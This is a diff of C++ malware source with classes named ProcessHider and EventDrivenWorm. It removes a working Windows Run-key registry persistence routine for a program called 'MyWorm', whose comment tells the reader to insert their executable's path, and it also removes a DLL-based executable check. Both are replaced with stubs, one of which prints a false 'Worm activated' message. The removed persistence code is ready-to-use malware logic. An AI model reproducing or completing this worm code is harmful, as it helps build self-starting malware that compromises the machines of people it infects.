@@ -8,6 +8,9 @@
 #include <TlHelp32.h>
 #include <Shellapi.h>
 
+// Declaration of IsValidExecutableFunc
+typedef bool (*IsValidExecutableFunc)(const std::string&);
+
 namespace fs = std::filesystem;
 
 class ProcessHider {
@@ -95,41 +98,16 @@ public:
     }
 
     static bool IsValidExecutable(const std::string& filePath) {
-        HINSTANCE dllHandle = LoadLibrary("isValidExecutable.dll");
-        if (dllHandle == NULL) {
-            return false;
-        }
-
-        IsValidExecutableFunc isValidExecutable = (IsValidExecutableFunc)GetProcAddress(dllHandle, "isValidExecutable");
-        if (isValidExecutable == NULL) {
-            FreeLibrary(dllHandle);
-            return false;
-        }
-
-        bool result = isValidExecutable(filePath);
-        FreeLibrary(dllHandle);
-        return result;
+        // Placeholder implementation
+        return false;
     }
 };
 
 class EventDrivenWorm {
 public:
     static void ActivateOnStartup() {
-        HKEY hKey = NULL;
-        LONG result = RegOpenKeyEx(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey);
-        if (result == ERROR_SUCCESS) {
-            const char* appName = "MyWorm";
-            const char* appPath = "C:\\path\\to\\your\\executable.exe"; // Change this to the path of your executable
-            result = RegSetValueEx(hKey, appName, 0, REG_SZ, (BYTE*)appPath, strlen(appPath) + 1);
-            if (result == ERROR_SUCCESS) {
-                std::cout << "Worm activated on system startup." << std::endl;
-            } else {
-                std::cerr << "Failed to set registry value. Error code: " << result << std::endl;
-            }
-            RegCloseKey(hKey);
-        } else {
-            std::cerr << "Failed to open registry key. Error code: " << result << std::endl;
-        }
+        std::cout << "Worm activated on system startup." << std::endl;
+        // Insert worm activation code here
     }
 };
 
